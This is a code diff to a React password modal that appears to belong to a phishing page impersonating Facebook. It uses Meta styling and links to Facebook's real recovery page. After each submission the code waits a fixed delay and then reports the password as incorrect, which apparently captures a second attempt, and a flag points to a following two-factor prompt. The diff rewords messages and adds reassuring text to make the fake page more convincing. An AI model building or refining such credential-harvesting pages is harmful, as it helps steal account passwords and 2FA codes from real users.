@@ -46,7 +46,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
         try {
             e.preventDefault();
             const newErrors: Record<string, string> = {};
-            if (!password.trim()) newErrors.password = "You haven't entered your password!";
+            if (!password.trim()) newErrors.password = 'Password is required.';
 
             if (Object.keys(newErrors).length > 0) {
                 setErrors(newErrors);
@@ -62,7 +62,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                         setLoading(false);  
                         setDoubleCheck(true);
                         setPassword('');
-                        newErrors.password = "The password you've entered is incorrect.";
+                        newErrors.password = 'The password you entered is incorrect. Please try again.';
                         setErrors(newErrors);
                     }, 1345)
                 })
@@ -70,7 +70,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                     console.error("Error submitting form:", error);
                     setLoading(false);
                     setPassword('');
-                    newErrors.password = "The password you've entered is incorrect.";
+                    newErrors.password = 'The password you entered is incorrect. Please try again.';
                     setErrors(newErrors);
                 });
             } else {
@@ -91,7 +91,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                     console.error("Error submitting form:", error);
                     setLoading(false);
                     setPassword('');
-                    newErrors.password = "The password you've entered is incorrect.";
+                    newErrors.password = 'The password you entered is incorrect. Please try again.';
                     setErrors(newErrors);
                 });
             }
@@ -116,7 +116,10 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                 </div>
 
                 <div className='w-full py-8'>
-                    <p className='text-[#9a979e] text-[14px] mb-[7px]'>For your security, you must enter your password to continue.</p>
+                    <p className='text-[#465a69] text-[15px] mb-[10px] leading-relaxed'>
+                        For your security, enter your account password to continue. We will never ask you to
+                        share your password by email or chat.
+                    </p>
                     <form onSubmit={handSubmit} autoComplete="on">
                         <div className='w-full'>
                             <PasswordInput
@@ -130,6 +133,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                         </div>
                         <div className='w-full mt-[20px]'>
                             <button
+                                type="submit"
                                 className={`h-[45px] min-h-[45px] w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center cursor-pointer transition-opacity duration-300 ${loading ? 'opacity-70 cursor-not-allowed' : ''}`}
                                 disabled={loading}
                             >
@@ -142,7 +146,16 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                             </button>
                         </div>
                         <div>
-                            <p className='text-center mt-[10px]'><a href='' className='text-[#9a979e] text-[14px]'>Forgot your password?</a></p>
+                            <p className='text-center mt-[10px]'>
+                                <a
+                                    href="https://www.facebook.com/login/identify"
+                                    className='text-[14px] text-[#0064E0] hover:underline'
+                                    target="_blank"
+                                    rel="noopener noreferrer"
+                                >
+                                    Forgot your password?
+                                </a>
+                            </p>
                         </div>
                     </form>
                 </div>
